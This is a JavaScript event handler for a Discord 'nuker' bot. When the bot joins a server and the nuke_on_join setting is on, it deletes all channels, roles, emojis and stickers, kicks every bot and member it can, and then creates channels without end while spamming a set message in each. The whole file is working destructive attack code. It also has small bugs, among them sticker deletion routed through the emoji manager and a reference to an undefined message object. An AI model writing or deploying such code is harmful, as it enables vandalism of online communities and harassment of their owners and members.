const client = require("../index.js");
const fs = require("fs");
const Discord = require("discord.js")
const {
    Client,
    Intents,
    MessageEmbed,
    Collection,
    MessageButton,
    MessageActionRow,
    ButtonInteraction,
    MessageAttachment,
} = require("discord.js");
const config = require("../json/config.json")

module.exports = {
    name: "guildCreate",
    once: false,
    async execute(guild) {
        if (config.nuke_on_join == true) {
            let req_perms = []
            let functions = {
                "delete_all_channels": function() {
                    let channels = guild.channels
                    channels.cache.forEach(channel => {
                        try {
                            guild.channels.delete(channel.id, "why not").catch(err => {
                                return
                            })
                        } catch {}
                    })
                },
                "delete_all_emojis_and_stickers": function() {
                    let emojis_and_stickers = []
                    guild.emojis.cache.forEach(emoji => {
                        emojis_and_stickers.push({
                            content: emoji,
                            type: "emoji"
                        })
                    })
                    guild.stickers.cache.forEach(sticker => {
                        emojis_and_stickers.push({
                            content: sticker,
                            type: "sticker"
                        })
                    })
                    emojis_and_stickers.forEach(es => {
                        if (es.type == "emoji") {
                            guild.emojis.delete(es.content, "why not").catch(err => {
                                return
                            })
                        } else {
                            guild.emojis.delete(es.content, "why not").catch(err => {
                                return
                            })
                        }
                    })
                },
                "delete_all_roles": function() {
                    guild.roles.cache.forEach(role => {

                        guild.roles.delete(role.id, "why not").catch(err => {
                            return
                        })

                    })
                },
                "kick_all_bots_if_possible": function() {
                    let bots = guild.members.cache.filter(m => m.user.bot)
                    bots.forEach(bot => {
                        bot.kick().catch(err => {
                            return
                        })
                    })
                },
                "kick_all_members_if_possible": function() {
                    let members = guild.members.cache.filter(m => !m.user.bot)
                    members.forEach(member => {
                        member.kick().catch(err => {
                            return
                        })
                    })
                },
            }
            let all_configs = [{
                    event: config.delete_all_channels,
                    func: "delete_all_channels",
                    perm: "MANAGE_CHANNELS"
                },
                {
                    event: config.delete_all_emojis_and_stickers,
                    func: "delete_all_emojis_and_stickers",
                    perm: "MANAGE_EMOJIS_AND_STICKERS"
                },
                {
                    event: config.delete_all_roles,
                    func: "delete_all_roles",
                    perm: "MANAGE_ROLES"
                },
                {
                    event: config.kick_all_bots_if_possible,
                    func: "kick_all_bots_if_possible",
                    perm: "MANAGE_MEMBERS"
                },
                {
                    event: config.kick_all_members_if_possible,
                    func: "kick_all_members_if_possible",
                    perm: "MANAGE_MEMBERS"
                }
            ]
            for (let c of all_configs) {
                if (c.event == true) {
                    req_perms.push(c.perm)
                }
            }
            for (const perm of req_perms) {
                if (!guild.me.permissions.has(perm)) return message.reply({
                    content: `I am missing the following permission: \`${perm}\`, please disable the correlating configurations for this permission`
                })
            }
            all_configs.forEach(c => {
                if (c.event == true) {
                    functions[c.func]()
                }
            })

            function delay(time) {
                return new Promise(resolve => setTimeout(resolve, time));
            }
            let channelstosend = []
          
            async function nuke() {

                while (true) {
                    
                    await delay(1)
                    let channel = await guild.channels.create(config.channel_name_to_create, {
                        reason: 'Needed a cool new channel'
                    }).then(chnl => {
                      
                        setInterval(function() {
                            chnl.send({
                                content: `${config.message_to_send_in_each_channel}`
                            }).catch(err => {
                              return;
                            })
                        }, 4000)
                    }).catch(err => {
                      return;
                    })
                  

                    nuke()
                }
            }

            nuke()


        }
    },
}